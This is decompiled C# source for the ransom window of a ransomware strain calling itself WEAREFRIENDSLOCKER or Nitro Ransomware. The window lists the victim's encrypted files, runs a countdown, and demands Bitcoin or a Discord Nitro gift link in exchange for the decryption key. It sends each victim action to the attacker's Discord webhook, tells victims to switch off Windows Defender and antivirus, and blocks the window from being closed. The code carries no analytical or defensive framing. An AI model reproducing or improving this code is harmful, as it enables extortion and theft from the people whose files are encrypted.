using System;
using System.ComponentModel;
using System.Drawing;
using System.Timers;
using System.Windows.Forms;

namespace NitroRansomware;

public class Form1 : Form
{
	private Timer t;

	private int h = 3;

	private int m;

	private int s;

	private Webhook ww = new Webhook(Program.WEBHOOK);

	private IContainer components;

	private BackgroundWorker backgroundWorker1;

	private Label label1;

	private TextBox textBox1;

	private Label label2;

	private Label label3;

	private Panel panel1;

	private Panel panel2;

	private Label label4;

	private Label label5;

	private TextBox textBox3;

	private Button button2;

	private TextBox textBox2;

	private TextBox textBox4;

	private Label label9;

	private TextBox textBox5;

	private Panel panel3;

	private Label label10;

	private Label label7;

	private Label label6;

	private Button button1;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		t = new Timer();
		t.Interval = 1000.0;
		t.Elapsed += OnTimeEvent;
		t.Start();
		((Control)textBox5).set_Text("");
		foreach (string item in Crypto.encryptedFileLog)
		{
			TextBox obj = textBox5;
			((Control)obj).set_Text(((Control)obj).get_Text() + "Encrypted: " + item + "\r\n");
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Invalid comparison between Unknown and I4
		((CancelEventArgs)(object)e).Cancel = (int)e.get_CloseReason() == 3;
	}

	private void button1_Click(object sender, EventArgs e)
	{
		if (NitroValid())
		{
			((Control)textBox3).set_Text(Crypto.fPassword);
			((Control)label7).set_Text("ZGVmYXVsdHBhc3N3b3Jk");
			((Control)label7).set_ForeColor(Color.LightGreen);
			((Control)textBox4).set_Text("");
			((Control)label1).set_Text("");
			((Control)panel3).set_BackColor(Color.FromArgb(35, 39, 42));
			((Control)textBox1).set_Text("How to Decrypt files:\r\n Enter decryption key and click on Decrypt button. \n Make sure Windows Defender and any other antivirus is off.\r\n Do not close the application while decrypting or else files may get corrupted.");
			t.Stop();
		}
	}

	private void button2_Click(object sender, EventArgs e)
	{
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox4).get_Text() == Crypto.fPassword)
		{
			ww.Send("```User has entered correct decryption key.. Decrypting files.```");
			MessageBox.Show("Key is correct. Decrypting files...", "WEAREFRIENDSLOCKER Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)64);
			Crypto.inPassword = Crypto.fPassword;
			((Control)textBox5).set_Text("Decrypting files.. \r\nThis may take a while. Loading..");
			Cursor.set_Current(Cursors.get_WaitCursor());
			Program.DecryptAll();
			Cursor.set_Current(Cursors.get_Default());
			MessageBox.Show("Task complete. If there are files that have not been decrypted, make sure you turn off all antivirus and Windows Defender, then try decrypting again. \r\nIf it doesn't work, delete all Desktop.ini.givemenitro files that you see and try again.", "Nitro Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
		else
		{
			MessageBox.Show("Invalid key", "WEAREFRIENDSLOCKER Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	private void label2_Click(object sender, EventArgs e)
	{
	}

	private void label9_Click(object sender, EventArgs e)
	{
	}

	private bool NitroValid()
	{
		//IL_0084: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f1: Unknown result type (might be due to invalid IL or missing references)
		Webhook webhook = new Webhook(Program.WEBHOOK);
		string text = ((Control)textBox2).get_Text();
		string empty = string.Empty;
		Console.WriteLine(text);
		if (text.Contains("discord.gift/"))
		{
			if (text.Contains("https://"))
			{
				int num = text.IndexOf("/");
				empty = text.Substring(num + 15);
				Console.WriteLine(empty);
			}
			else
			{
				int num2 = text.IndexOf("/");
				empty = text.Substring(num2 + 1);
				MessageBox.Show("COMEO ONNNNNN.. .", "WEAREFRIENDSLOCKER Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
			if (Nitro.Check(empty))
			{
				webhook.Send("**Valid nitro code was received**");
				webhook.Send(text);
				MessageBox.Show("Success! Valid nitro code was sent. Your decryption key is now available. You may start decrypting your files now.", "WEAREFRIENDSLOCKER Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)64);
				return true;
			}
			webhook.Send("```User sent invalid discord gift Link.```");
			MessageBox.Show("Invalid Nitro", "Nitro Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else
		{
			webhook.Send("```User sent invalid discord gift Link.```");
			MessageBox.Show("Please enter a Discord nitro gift in this format discord.gift/code here", "Nitro Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		return false;
	}

	private void OnTimeEvent(object sender, ElapsedEventArgs e)
	{
		((Control)this).Invoke((Delegate)(Action)delegate
		{
			if (s < 1)
			{
				s = 59;
				if (m == 0)
				{
					m = 59;
					if (h != 0)
					{
						h--;
					}
				}
				else
				{
					m--;
				}
			}
			else
			{
				s--;
			}
			if (s != 0 || m != 0)
			{
			}
			((Control)label10).set_Text($"{h.ToString().PadLeft(2, '0')}:{m.ToString().PadLeft(2, '0')}:{s.ToString().PadLeft(2, '0')}");
		});
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_0117: Unknown result type (might be due to invalid IL or missing references)
		//IL_0121: Expected O, but got Unknown
		//IL_01bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c6: Expected O, but got Unknown
		//IL_027f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0289: Expected O, but got Unknown
		//IL_0323: Unknown result type (might be due to invalid IL or missing references)
		//IL_032d: Expected O, but got Unknown
		//IL_04a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ad: Expected O, but got Unknown
		//IL_0534: Unknown result type (might be due to invalid IL or missing references)
		//IL_053e: Expected O, but got Unknown
		//IL_0828: Unknown result type (might be due to invalid IL or missing references)
		//IL_0832: Expected O, but got Unknown
		//IL_08e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_08f0: Expected O, but got Unknown
		//IL_0a1b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a25: Expected O, but got Unknown
		//IL_0aac: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ab6: Expected O, but got Unknown
		//IL_0b43: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b4d: Expected O, but got Unknown
		backgroundWorker1 = new BackgroundWorker();
		label1 = new Label();
		textBox1 = new TextBox();
		label2 = new Label();
		label3 = new Label();
		panel1 = new Panel();
		panel2 = new Panel();
		label4 = new Label();
		label5 = new Label();
		textBox3 = new TextBox();
		button2 = new Button();
		textBox2 = new TextBox();
		textBox4 = new TextBox();
		label9 = new Label();
		textBox5 = new TextBox();
		panel3 = new Panel();
		label10 = new Label();
		label7 = new Label();
		label6 = new Label();
		button1 = new Button();
		((Control)panel2).SuspendLayout();
		((Control)panel3).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.Red);
		((Control)label1).set_Location(new Point(3, 10));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(787, 37));
		((Control)label1).set_TabIndex(2);
		((Control)label1).set_Text("YOU HAVE BEEN HIT BY WEAREFRIENDSLOCKER");
		((Control)textBox1).set_BackColor(Color.FromArgb(35, 39, 42));
		((TextBoxBase)textBox1).set_BorderStyle((BorderStyle)0);
		((Control)textBox1).set_Font(new Font("Segoe UI", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox1).set_ForeColor(Color.BlueViolet);
		((Control)textBox1).set_Location(new Point(17, 108));
		((TextBoxBase)textBox1).set_Multiline(true);
		((Control)textBox1).set_Name("textBox1");
		((TextBoxBase)textBox1).set_ReadOnly(true);
		textBox1.set_ScrollBars((ScrollBars)2);
		((Control)textBox1).set_Size(new Size(370, 167));
		((Control)textBox1).set_TabIndex(3);
		((Control)textBox1).set_TabStop(false);
		((Control)textBox1).set_Text("YOU ARE FUCKED UNLESS YOU SEND US 0.05 BTC TO THIS ADDRESS: bc1q4v9ngtqpdq6jfvmz7f72xd7cg97cd082vnmv63\r\nAND SEND US PROOF TO THIS EMAIL: clay_whoiami_1@protonmail.ch");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Segoe UI", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.BlueViolet);
		((Control)label2).set_Location(new Point(12, 69));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(49, 25));
		((Control)label2).set_TabIndex(5);
		((Control)label2).set_Text("Info:");
		((Control)label2).add_Click((EventHandler)label2_Click);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Segoe UI", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.BlueViolet);
		((Control)label3).set_Location(new Point(444, 69));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(151, 25));
		((Control)label3).set_TabIndex(6);
		((Control)label3).set_Text("Time Remaining:");
		((Control)panel1).set_BackColor(Color.FromArgb(35, 39, 42));
		((Control)panel1).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)panel1).set_Location(new Point(-1, -4));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(807, 32));
		((Control)panel1).set_TabIndex(4);
		((Control)panel2).set_BackColor(Color.FromArgb(35, 39, 42));
		((Control)panel2).get_Controls().Add((Control)(object)label1);
		((Control)panel2).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)panel2).set_Location(new Point(-1, -1));
		((Control)panel2).set_Name("panel2");
		((Control)panel2).set_Size(new Size(804, 67));
		((Control)panel2).set_TabIndex(7);
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Segoe UI", 8f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(SystemColors.Control);
		((Control)label4).set_Location(new Point(14, 410));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(102, 13));
		((Control)label4).set_TabIndex(9);
		((Control)label4).set_Text("BITCOIN ADDRESS:");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Segoe UI", 8f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(SystemColors.Control);
		((Control)label5).set_Location(new Point(58, 478));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(122, 13));
		((Control)label5).set_TabIndex(11);
		((Control)label5).set_Text("Your Decryption key is:");
		((Control)textBox3).set_BackColor(Color.FromArgb(35, 39, 42));
		((TextBoxBase)textBox3).set_BorderStyle((BorderStyle)1);
		((Control)textBox3).set_ForeColor(SystemColors.Window);
		((Control)textBox3).set_Location(new Point(17, 494));
		((Control)textBox3).set_Name("textBox3");
		((TextBoxBase)textBox3).set_ReadOnly(true);
		((Control)textBox3).set_Size(new Size(203, 20));
		((Control)textBox3).set_TabIndex(12);
		((Control)textBox3).set_TabStop(false);
		((Control)button2).set_BackColor(SystemColors.ButtonHighlight);
		((ButtonBase)button2).set_FlatStyle((FlatStyle)0);
		((Control)button2).set_Location(new Point(657, 516));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(75, 23));
		((Control)button2).set_TabIndex(15);
		((Control)button2).set_Text("Decrypt files");
		((ButtonBase)button2).set_UseVisualStyleBackColor(false);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)textBox2).set_BackColor(Color.FromArgb(35, 39, 42));
		((TextBoxBase)textBox2).set_BorderStyle((BorderStyle)1);
		((Control)textBox2).set_ForeColor(SystemColors.Window);
		((Control)textBox2).set_Location(new Point(17, 438));
		((Control)textBox2).set_Name("textBox2");
		((Control)textBox2).set_Size(new Size(246, 20));
		((Control)textBox2).set_TabIndex(8);
		((Control)textBox2).set_TabStop(false);
		((Control)textBox2).set_Text("bc1q4v9ngtqpdq6jfvmz7f72xd7cg97cd082vnmv63");
		((Control)textBox4).set_BackColor(Color.FromArgb(35, 39, 42));
		((TextBoxBase)textBox4).set_BorderStyle((BorderStyle)1);
		((Control)textBox4).set_ForeColor(SystemColors.Window);
		((Control)textBox4).set_Location(new Point(448, 516));
		((Control)textBox4).set_Name("textBox4");
		((Control)textBox4).set_Size(new Size(203, 20));
		((Control)textBox4).set_TabIndex(17);
		((Control)textBox4).set_TabStop(false);
		((Control)textBox4).set_Text("send BTC TO GET KEY");
		((Control)label9).set_AutoSize(true);
		((Control)label9).set_Font(new Font("Segoe UI", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label9).set_ForeColor(Color.BlueViolet);
		((Control)label9).set_Location(new Point(13, 292));
		((Control)label9).set_Name("label9");
		((Control)label9).set_Size(new Size(35, 19));
		((Control)label9).set_TabIndex(19);
		((Control)label9).set_Text("Log:");
		((Control)label9).add_Click((EventHandler)label9_Click);
		((Control)textBox5).set_BackColor(Color.FromArgb(35, 39, 42));
		((TextBoxBase)textBox5).set_BorderStyle((BorderStyle)0);
		((Control)textBox5).set_Font(new Font("Segoe UI", 7.2f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox5).set_ForeColor(Color.BlueViolet);
		((Control)textBox5).set_Location(new Point(17, 326));
		((TextBoxBase)textBox5).set_Multiline(true);
		((Control)textBox5).set_Name("textBox5");
		((TextBoxBase)textBox5).set_ReadOnly(true);
		textBox5.set_ScrollBars((ScrollBars)2);
		((Control)textBox5).set_Size(new Size(121, 59));
		((Control)textBox5).set_TabIndex(20);
		((Control)textBox5).set_TabStop(false);
		((Control)panel3).set_BackColor(Color.Black);
		((Control)panel3).get_Controls().Add((Control)(object)label10);
		((Control)panel3).set_Location(new Point(441, 108));
		((Control)panel3).set_Name("panel3");
		((Control)panel3).set_Size(new Size(347, 167));
		((Control)panel3).set_TabIndex(21);
		((Control)label10).set_AutoSize(true);
		((Control)label10).set_BackColor(Color.Gold);
		((Control)label10).set_Font(new Font("Microsoft Sans Serif", 50f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label10).set_ForeColor(Color.Purple);
		((Control)label10).set_Location(new Point(33, 41));
		((Control)label10).set_Name("label10");
		((Control)label10).set_Size(new Size(293, 76));
		((Control)label10).set_TabIndex(22);
		((Control)label10).set_Text("00:00:00");
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Font(new Font("Segoe UI", 8f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label7).set_ForeColor(SystemColors.Control);
		((Control)label7).set_Location(new Point(508, 480));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(236, 13));
		((Control)label7).set_TabIndex(16);
		((Control)label7).set_Text("Warning: Do not try guessing the password.");
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font("Segoe UI", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label6).set_ForeColor(SystemColors.Control);
		((Control)label6).set_Location(new Point(653, 442));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(84, 19));
		((Control)label6).set_TabIndex(13);
		((Control)label6).set_Text("Decrypt files");
		((Control)button1).set_BackColor(SystemColors.ButtonHighlight);
		((ButtonBase)button1).set_FlatStyle((FlatStyle)0);
		((Control)button1).set_Location(new Point(269, 438));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 23));
		((Control)button1).set_TabIndex(10);
		((Control)button1).set_Text("Get Key");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(44, 47, 51));
		((Form)this).set_ClientSize(new Size(800, 600));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)panel3);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)textBox5);
		((Control)this).get_Controls().Add((Control)(object)label9);
		((Control)this).get_Controls().Add((Control)(object)textBox4);
		((Control)this).get_Controls().Add((Control)(object)label7);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)textBox3);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)panel2);
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Control)this).set_ForeColor(SystemColors.ControlText);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)panel2).ResumeLayout(false);
		((Control)panel2).PerformLayout();
		((Control)panel3).ResumeLayout(false);
		((Control)panel3).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
